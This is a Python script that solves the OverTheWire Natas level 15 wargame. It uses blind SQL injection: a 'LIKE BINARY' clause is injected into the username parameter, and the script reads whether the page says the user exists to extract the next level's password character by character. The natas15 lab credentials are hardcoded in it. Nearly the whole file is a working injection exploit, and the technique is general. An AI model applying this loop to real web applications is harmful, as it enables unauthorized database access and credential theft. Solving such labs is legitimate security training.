import requests

target = 'http://natas15.natas.labs.overthewire.org'
charset_1 = "23579adfgijklqruADEHOPRTVZ"

password = ""
while len(password) != 32:
	for c in charset_1:
		t = password + c
		username = ('natas16" AND password LIKE BINARY "' + t +'%" "')
		r = requests.get(target,
                   auth=('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'),
			params={"username": username}
		)
		if "This user exists" in r.text:
			print ('PASS: ' + t.ljust(32, '*'))
			password = t
			break
